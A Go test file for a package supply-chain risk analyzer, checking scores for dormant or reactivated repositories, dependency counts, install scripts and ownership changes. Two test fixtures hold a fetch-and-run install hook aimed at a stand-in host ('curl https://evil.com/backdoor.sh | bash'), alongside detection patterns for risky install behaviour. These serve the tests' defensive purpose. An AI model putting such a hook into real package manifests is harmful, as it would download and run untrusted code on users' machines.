package analyzer

import (
	"testing"
	"time"

	"github.com/metalstormbass/snyft/pkg/fetcher"
	"github.com/metalstormbass/snyft/pkg/models"
)

func TestScoreReleaseAnomalies(t *testing.T) {
	analyzer := NewAnalyzer()

	tests := []struct {
		name           string
		result         models.AnalysisResult
		expectedRisk   int
		expectedDesc   string
		expectedVerify bool
	}{
		{
			name: "No commit history available",
			result: models.AnalysisResult{
				Metadata: models.PackageMetadata{
					RepoLastCommit: time.Time{}, // Zero time
				},
			},
			expectedRisk:   1,
			expectedDesc:   "Unable to verify release patterns",
			expectedVerify: false,
		},
		{
			name: "Dormant package (>1 year inactive)",
			result: models.AnalysisResult{
				Metadata: models.PackageMetadata{
					RepoLastCommit: time.Now().AddDate(-2, 0, 0), // 2 years ago
					RepoCreatedAt:  time.Now().AddDate(-3, 0, 0), // 3 years ago
				},
				RepositoryURL: "https://github.com/example/repo",
			},
			expectedRisk:   1,
			expectedDesc:   "Package appears dormant",
			expectedVerify: true,
		},
		{
			name: "Regular consistent activity",
			result: models.AnalysisResult{
				Metadata: models.PackageMetadata{
					RepoLastCommit: time.Now().AddDate(0, -2, 0), // 2 months ago
					RepoCreatedAt:  time.Now().AddDate(-2, 0, 0), // 2 years ago
				},
				RepositoryURL: "https://github.com/example/active-repo",
			},
			expectedRisk:   0,
			expectedDesc:   "Regular, consistent releases",
			expectedVerify: true,
		},
		{
			name: "New package with recent activity",
			result: models.AnalysisResult{
				Metadata: models.PackageMetadata{
					RepoLastCommit: time.Now().AddDate(0, -1, 0), // 1 month ago
					RepoCreatedAt:  time.Now().AddDate(0, -6, 0), // 6 months ago
				},
				RepositoryURL: "https://github.com/example/new-repo",
			},
			expectedRisk:   0,
			expectedDesc:   "Regular, consistent releases",
			expectedVerify: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := analyzer.scoreReleaseAnomalies(&tt.result)

			if score.RiskPoints != tt.expectedRisk {
				t.Errorf("Expected RiskPoints=%d, got %d", tt.expectedRisk, score.RiskPoints)
			}

			if score.Verified != tt.expectedVerify {
				t.Errorf("Expected Verified=%v, got %v", tt.expectedVerify, score.Verified)
			}

			// Check that description contains expected keywords
			// (exact match not required as implementation may vary)
			if tt.expectedDesc != "" && score.Description == "" {
				t.Errorf("Expected non-empty description, got empty")
			}
		})
	}
}

func TestDetectReleaseAnomaly(t *testing.T) {
	analyzer := NewAnalyzer()
	repoCreatedAt := time.Now().AddDate(-3, 0, 0) // 3 years ago

	tests := []struct {
		name         string
		releases     []fetcher.GitHubRelease
		expectedRisk *int // nil if no anomaly expected
		expectedDesc string
	}{
		{
			name:         "No releases",
			releases:     []fetcher.GitHubRelease{},
			expectedRisk: nil,
		},
		{
			name: "Single release",
			releases: []fetcher.GitHubRelease{
				{PublishedAt: time.Now().AddDate(0, -1, 0), Draft: false, Prerelease: false},
			},
			expectedRisk: nil,
		},
		{
			name: "Suspicious reactivation - long dormancy then recent release",
			releases: []fetcher.GitHubRelease{
				{PublishedAt: time.Now().AddDate(0, -1, 0), Draft: false, Prerelease: false},  // 1 month ago
				{PublishedAt: time.Now().AddDate(-2, 0, 0), Draft: false, Prerelease: false}, // 2 years ago
			},
			expectedRisk: intPtr(2),
			expectedDesc: "Suspicious reactivation",
		},
		{
			name: "Regular release pattern - consistent frequency",
			releases: []fetcher.GitHubRelease{
				{PublishedAt: time.Now().AddDate(0, -3, 0), Draft: false, Prerelease: false},  // 3 months ago
				{PublishedAt: time.Now().AddDate(0, -6, 0), Draft: false, Prerelease: false},  // 6 months ago
				{PublishedAt: time.Now().AddDate(0, -9, 0), Draft: false, Prerelease: false},  // 9 months ago
				{PublishedAt: time.Now().AddDate(-1, 0, 0), Draft: false, Prerelease: false}, // 12 months ago
			},
			expectedRisk: nil, // No anomaly
		},
		{
			name: "Unusual pattern - sudden spike in release frequency",
			releases: []fetcher.GitHubRelease{
				{PublishedAt: time.Now().AddDate(0, 0, -3), Draft: false, Prerelease: false},  // 3 days ago
				{PublishedAt: time.Now().AddDate(0, 0, -8), Draft: false, Prerelease: false},  // 8 days ago (very close!)
				{PublishedAt: time.Now().AddDate(0, -4, 0), Draft: false, Prerelease: false},  // 4 months ago
				{PublishedAt: time.Now().AddDate(0, -8, 0), Draft: false, Prerelease: false},  // 8 months ago
				{PublishedAt: time.Now().AddDate(-1, -2, 0), Draft: false, Prerelease: false}, // 14 months ago
			},
			expectedRisk: intPtr(2),
			expectedDesc: "Unusual release pattern",
		},
		{
			name: "Drafts and prereleases are ignored",
			releases: []fetcher.GitHubRelease{
				{PublishedAt: time.Now().AddDate(0, -1, 0), Draft: true, Prerelease: false},   // Draft
				{PublishedAt: time.Now().AddDate(0, -2, 0), Draft: false, Prerelease: true},   // Prerelease
				{PublishedAt: time.Now().AddDate(0, -3, 0), Draft: false, Prerelease: false}, // Valid
			},
			expectedRisk: nil, // Only 1 valid release after filtering
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := analyzer.detectReleaseAnomaly(tt.releases, repoCreatedAt)

			if tt.expectedRisk == nil {
				if score != nil {
					t.Errorf("Expected no anomaly, but got RiskPoints=%d", score.RiskPoints)
				}
			} else {
				if score == nil {
					t.Errorf("Expected anomaly with RiskPoints=%d, but got nil", *tt.expectedRisk)
				} else if score.RiskPoints != *tt.expectedRisk {
					t.Errorf("Expected RiskPoints=%d, got %d", *tt.expectedRisk, score.RiskPoints)
				}
			}
		})
	}
}

func TestDetectCommitFrequencyAnomaly(t *testing.T) {
	analyzer := NewAnalyzer()
	repoCreatedAt := time.Now().AddDate(-3, 0, 0) // 3 years old

	tests := []struct {
		name           string
		recentCommits  []fetcher.GitHubCommit
		olderCommits   []fetcher.GitHubCommit
		repoAge        time.Time
		expectedRisk   *int // nil if no anomaly
		expectedDesc   string
	}{
		{
			name:          "Suspicious spike - dormant then active",
			recentCommits: makeCommits(25, time.Now().AddDate(0, -6, 0)), // 25 commits in last year
			olderCommits:  makeCommits(2, time.Now().AddDate(-2, 0, 0)),  // 2 commits in previous year
			repoAge:       repoCreatedAt,
			expectedRisk:  intPtr(2),
			expectedDesc:  "Suspicious commit frequency spike",
		},
		{
			name:          "Moderate reactivation",
			recentCommits: makeCommits(10, time.Now().AddDate(0, -6, 0)), // 10 commits in last year
			olderCommits:  makeCommits(0, time.Now().AddDate(-2, 0, 0)),  // 0 commits in previous year
			repoAge:       repoCreatedAt,
			expectedRisk:  intPtr(1),
			expectedDesc:  "Package reactivated after dormancy",
		},
		{
			name:          "Consistent activity",
			recentCommits: makeCommits(20, time.Now().AddDate(0, -6, 0)), // 20 commits
			olderCommits:  makeCommits(18, time.Now().AddDate(-2, 0, 0)), // 18 commits
			repoAge:       repoCreatedAt,
			expectedRisk:  nil, // No anomaly
		},
		{
			name:          "New repo - not enough history",
			recentCommits: makeCommits(10, time.Now().AddDate(0, -3, 0)),
			olderCommits:  makeCommits(0, time.Now().AddDate(-1, 0, 0)),
			repoAge:       time.Now().AddDate(-1, 0, 0), // Only 1 year old
			expectedRisk:  nil,                           // Too young for this check
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := analyzer.detectCommitFrequencyAnomaly(tt.recentCommits, tt.olderCommits, tt.repoAge)

			if tt.expectedRisk == nil {
				if score != nil {
					t.Errorf("Expected no anomaly, but got RiskPoints=%d", score.RiskPoints)
				}
			} else {
				if score == nil {
					t.Errorf("Expected anomaly with RiskPoints=%d, but got nil", *tt.expectedRisk)
				} else if score.RiskPoints != *tt.expectedRisk {
					t.Errorf("Expected RiskPoints=%d, got %d", *tt.expectedRisk, score.RiskPoints)
				}
			}
		})
	}
}

func TestScoreDependencySprawl_Few(t *testing.T) {
	a := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			DependencyMetrics: &models.DependencyMetrics{
				TransitiveCount: 5,
				DirectCount:     2,
				Verified:        true,
			},
		},
	}

	score := a.scoreDependencySprawl(result)

	if score.RiskPoints != 0 {
		t.Errorf("Expected 0 risk points for few dependencies, got %d", score.RiskPoints)
	}

	if !score.Verified {
		t.Error("Expected verified score")
	}

	if score.Description != "Few transitive dependencies" {
		t.Errorf("Unexpected description: %s", score.Description)
	}
}

func TestScoreDependencySprawl_Moderate(t *testing.T) {
	a := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			DependencyMetrics: &models.DependencyMetrics{
				TransitiveCount: 25,
				DirectCount:     5,
				Verified:        true,
			},
		},
	}

	score := a.scoreDependencySprawl(result)

	if score.RiskPoints != 1 {
		t.Errorf("Expected 1 risk point for moderate dependencies, got %d", score.RiskPoints)
	}

	if !score.Verified {
		t.Error("Expected verified score")
	}

	if score.Description != "Moderate transitive dependencies" {
		t.Errorf("Unexpected description: %s", score.Description)
	}
}

func TestScoreDependencySprawl_Many(t *testing.T) {
	a := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			DependencyMetrics: &models.DependencyMetrics{
				TransitiveCount: 75,
				DirectCount:     10,
				Verified:        true,
			},
		},
	}

	score := a.scoreDependencySprawl(result)

	if score.RiskPoints != 2 {
		t.Errorf("Expected 2 risk points for many dependencies, got %d", score.RiskPoints)
	}

	if !score.Verified {
		t.Error("Expected verified score")
	}

	if score.Description != "Many transitive dependencies" {
		t.Errorf("Unexpected description: %s", score.Description)
	}
}

func TestScoreDependencySprawl_EdgeCase_Exactly10(t *testing.T) {
	a := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			DependencyMetrics: &models.DependencyMetrics{
				TransitiveCount: 10,
				DirectCount:     3,
				Verified:        true,
			},
		},
	}

	score := a.scoreDependencySprawl(result)

	// 10 deps should be "moderate" (1 point)
	if score.RiskPoints != 1 {
		t.Errorf("Expected 1 risk point for exactly 10 dependencies, got %d", score.RiskPoints)
	}
}

func TestScoreDependencySprawl_EdgeCase_Exactly50(t *testing.T) {
	a := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			DependencyMetrics: &models.DependencyMetrics{
				TransitiveCount: 50,
				DirectCount:     5,
				Verified:        true,
			},
		},
	}

	score := a.scoreDependencySprawl(result)

	// 50 deps should still be "moderate" (1 point)
	if score.RiskPoints != 1 {
		t.Errorf("Expected 1 risk point for exactly 50 dependencies, got %d", score.RiskPoints)
	}
}

func TestScoreDependencySprawl_Fallback_NoMetrics(t *testing.T) {
	a := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			RepoStars:     5,
			DownloadCount: 100,
		},
	}

	score := a.scoreDependencySprawl(result)

	// Should fall back to heuristics
	if score.Verified {
		t.Error("Expected unverified score when using heuristics")
	}

	// Low stars = high risk (2 points)
	if score.RiskPoints != 2 {
		t.Errorf("Expected 2 risk points for low popularity, got %d", score.RiskPoints)
	}
}

// Helper function to create a pointer to an int
func intPtr(i int) *int {
	return &i
}

// Helper function to generate mock commits
func makeCommits(count int, startDate time.Time) []fetcher.GitHubCommit {
	commits := make([]fetcher.GitHubCommit, count)
	for i := 0; i < count; i++ {
		commits[i] = fetcher.GitHubCommit{
			SHA: "abc123",
			Commit: fetcher.GitHubCommitDetails{
				Author: fetcher.GitHubCommitAuthor{
					Name:  "Test Author",
					Email: "test@example.com",
					Date:  startDate.AddDate(0, 0, i*7), // Spread commits weekly
				},
			},
		}
	}
	return commits
}

func TestScoreInstallExecution_NoScripts(t *testing.T) {
	analyzer := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			HasInstallScripts: false,
			InstallScripts:    map[string]string{},
		},
	}

	score := analyzer.scoreInstallExecution(result)

	if score.RiskPoints != 0 {
		t.Errorf("Expected 0 risk points for no scripts, got %d", score.RiskPoints)
	}
	if score.Score != 2 {
		t.Errorf("Expected score of 2, got %d", score.Score)
	}
	if !score.Verified {
		t.Error("Expected score to be verified")
	}
}

func TestScoreInstallExecution_SingleBenignScript(t *testing.T) {
	analyzer := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"postinstall": "echo 'Installation complete'",
			},
			InstallScriptAnalysis: &models.InstallScriptAnalysis{
				HasDangerousPatterns: false,
				RiskLevel:            "LOW",
				ScriptCount:          0,
			},
		},
	}

	score := analyzer.scoreInstallExecution(result)

	if score.RiskPoints != 1 {
		t.Errorf("Expected 1 risk point for single benign script, got %d", score.RiskPoints)
	}
	if score.Score != 0 {
		t.Errorf("Expected score of 0, got %d", score.Score)
	}
}

func TestScoreInstallExecution_MultipleBenignScripts(t *testing.T) {
	analyzer := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"preinstall":  "echo 'Pre-install'",
				"postinstall": "echo 'Post-install'",
			},
			InstallScriptAnalysis: &models.InstallScriptAnalysis{
				HasDangerousPatterns: false,
				RiskLevel:            "LOW",
				ScriptCount:          0,
			},
		},
	}

	score := analyzer.scoreInstallExecution(result)

	if score.RiskPoints != 2 {
		t.Errorf("Expected 2 risk points for multiple scripts, got %d", score.RiskPoints)
	}
	if score.Score != 0 {
		t.Errorf("Expected score of 0, got %d", score.Score)
	}
}

func TestScoreInstallExecution_DangerousScript(t *testing.T) {
	analyzer := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"postinstall": "curl https://evil.com/backdoor.sh | bash",
			},
			InstallScriptAnalysis: &models.InstallScriptAnalysis{
				HasDangerousPatterns: true,
				RiskLevel:            "HIGH",
				ScriptCount:          1,
				DangerousPatterns: []models.DangerousPattern{
					{
						Pattern:     "curl/wget | bash",
						Description: "Downloads and executes remote script without verification",
						Severity:    "HIGH",
					},
				},
			},
		},
	}

	score := analyzer.scoreInstallExecution(result)

	if score.RiskPoints != 2 {
		t.Errorf("Expected 2 risk points for dangerous script, got %d", score.RiskPoints)
	}
	if score.Score != 0 {
		t.Errorf("Expected score of 0, got %d", score.Score)
	}
	if score.Description != "Dangerous install-time operations detected" {
		t.Errorf("Unexpected description: %s", score.Description)
	}
}

func TestScoreInstallExecution_PythonSetupWithCmdClass(t *testing.T) {
	analyzer := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"setup.py": "cmdclass={'install': CustomInstall}",
			},
			InstallScriptAnalysis: &models.InstallScriptAnalysis{
				HasDangerousPatterns: true,
				RiskLevel:            "MEDIUM",
				ScriptCount:          1,
				DangerousPatterns: []models.DangerousPattern{
					{
						Pattern:     "cmdclass override",
						Description: "Overrides setup.py command classes",
						Severity:    "MEDIUM",
					},
				},
			},
		},
	}

	score := analyzer.scoreInstallExecution(result)

	if score.RiskPoints != 2 {
		t.Errorf("Expected 2 risk points for dangerous Python setup, got %d", score.RiskPoints)
	}
}

func TestScoreInstallExecution_JavaWithMavenExecPlugin(t *testing.T) {
	analyzer := NewAnalyzer()
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"pom.xml": "<plugin>maven-exec-plugin</plugin>",
			},
			InstallScriptAnalysis: &models.InstallScriptAnalysis{
				HasDangerousPatterns: true,
				RiskLevel:            "HIGH",
				ScriptCount:          1,
				DangerousPatterns: []models.DangerousPattern{
					{
						Pattern:     "maven-exec-plugin",
						Description: "Executes arbitrary commands during build",
						Severity:    "HIGH",
					},
				},
			},
		},
	}

	score := analyzer.scoreInstallExecution(result)

	if score.RiskPoints != 2 {
		t.Errorf("Expected 2 risk points for dangerous Maven plugin, got %d", score.RiskPoints)
	}
}

func TestHasInstallTimeScripts_NPM(t *testing.T) {
	tests := []struct {
		name     string
		scripts  map[string]string
		expected bool
	}{
		{
			name: "has postinstall",
			scripts: map[string]string{
				"postinstall": "echo 'done'",
				"test":        "jest",
			},
			expected: true,
		},
		{
			name: "has preinstall",
			scripts: map[string]string{
				"preinstall": "echo 'preparing'",
				"build":      "webpack",
			},
			expected: true,
		},
		{
			name: "has install",
			scripts: map[string]string{
				"install": "node-gyp rebuild",
			},
			expected: true,
		},
		{
			name: "no install scripts",
			scripts: map[string]string{
				"test":  "jest",
				"build": "webpack",
				"start": "node index.js",
			},
			expected: false,
		},
		{
			name: "empty install script",
			scripts: map[string]string{
				"postinstall": "",
				"test":        "jest",
			},
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := hasInstallTimeScripts(tt.scripts)
			if result != tt.expected {
				t.Errorf("Expected %v, got %v for scripts: %v", tt.expected, result, tt.scripts)
			}
		})
	}
}

func TestConvertToModelAnalysis(t *testing.T) {
	scriptAnalysis := ScriptAnalysis{
		HasDangerousPatterns: true,
		RiskLevel:            "HIGH",
		DangerousPatterns: []DangerousPattern{
			{
				Pattern:     "curl/wget | bash",
				Description: "Downloads and executes remote script",
				Severity:    "HIGH",
				Match:       "curl https://evil.com | bash",
			},
			{
				Pattern:     "eval()",
				Description: "Uses eval()",
				Severity:    "HIGH",
				Match:       "eval(code)",
			},
		},
	}

	modelAnalysis := convertToModelAnalysis(scriptAnalysis)

	if modelAnalysis.HasDangerousPatterns != scriptAnalysis.HasDangerousPatterns {
		t.Error("HasDangerousPatterns not converted correctly")
	}
	if modelAnalysis.RiskLevel != scriptAnalysis.RiskLevel {
		t.Error("RiskLevel not converted correctly")
	}
	if len(modelAnalysis.DangerousPatterns) != len(scriptAnalysis.DangerousPatterns) {
		t.Errorf("Expected %d patterns, got %d", len(scriptAnalysis.DangerousPatterns), len(modelAnalysis.DangerousPatterns))
	}

	for i, p := range modelAnalysis.DangerousPatterns {
		if p.Pattern != scriptAnalysis.DangerousPatterns[i].Pattern {
			t.Errorf("Pattern %d not converted correctly", i)
		}
		if p.Description != scriptAnalysis.DangerousPatterns[i].Description {
			t.Errorf("Description %d not converted correctly", i)
		}
		if p.Severity != scriptAnalysis.DangerousPatterns[i].Severity {
			t.Errorf("Severity %d not converted correctly", i)
		}
		if p.Match != scriptAnalysis.DangerousPatterns[i].Match {
			t.Errorf("Match %d not converted correctly", i)
		}
	}
}
func TestScoreOwnershipChanges_FallbackBehavior(t *testing.T) {
	analyzer := &Analyzer{
		githubClient: fetcher.NewGitHubClient(),
		npmClient:    fetcher.NewNPMClient(),
		pypiClient:   fetcher.NewPyPIClient(),
	}

	// Test fallback to repository age when APIs fail
	result := models.AnalysisResult{
		RepositoryURL: "",
		Dependency: models.Dependency{
			Name:      "nonexistent-package-xyz-123456789",
			Ecosystem: models.EcosystemNPM,
		},
		Metadata: models.PackageMetadata{
			RepoCreatedAt: time.Now().AddDate(-2, 0, 0),
			Maintainers:   []string{"alice", "bob", "charlie"},
		},
	}

	score := analyzer.scoreOwnershipChanges(&result)

	// Should have evidence
	if score.Evidence == "" {
		t.Error("scoreOwnershipChanges() evidence should not be empty")
	}

	// Should have a valid risk score
	if score.RiskPoints < 0 || score.RiskPoints > 2 {
		t.Errorf("scoreOwnershipChanges() risk points = %v, want 0-2", score.RiskPoints)
	}
}

func TestCalculateSupplyChainScore_OwnershipChangesIntegration(t *testing.T) {
	analyzer := &Analyzer{
		githubClient: fetcher.NewGitHubClient(),
		npmClient:    fetcher.NewNPMClient(),
		pypiClient:   fetcher.NewPyPIClient(),
		mavenClient:  fetcher.NewMavenClient(),
		ossfClient:   fetcher.NewOSSFClient(),
	}

	result := models.AnalysisResult{
		RepositoryURL: "",
		Dependency: models.Dependency{
			Name:      "nonexistent-package-xyz-123456789",
			Ecosystem: models.EcosystemNPM,
		},
		Metadata: models.PackageMetadata{
			RepoCreatedAt: time.Now().AddDate(-3, 0, 0),
			Maintainers:   []string{"alice", "bob", "charlie", "dave"},
			HasCI:         true,
			CISystems:     []string{"GitHub Actions"},
		},
	}

	analyzer.calculateSupplyChainScore(&result)

	if result.SupplyChainScore == nil {
		t.Fatal("calculateSupplyChainScore() should set SupplyChainScore")
	}

	// Check that ownership changes category is scored
	ownershipScore := result.SupplyChainScore.CategoryScores.OwnershipChanges

	// Should have evidence
	if ownershipScore.Evidence == "" {
		t.Error("OwnershipChanges evidence should not be empty")
	}

	// Should have a valid risk score
	if ownershipScore.RiskPoints < 0 || ownershipScore.RiskPoints > 2 {
		t.Errorf("OwnershipChanges risk points = %v, want 0-2", ownershipScore.RiskPoints)
	}

	// Total score should be in valid range
	if result.SupplyChainScore.TotalScore < 0 || result.SupplyChainScore.TotalScore > 14 {
		t.Errorf("TotalScore = %v, want 0-14", result.SupplyChainScore.TotalScore)
	}
}
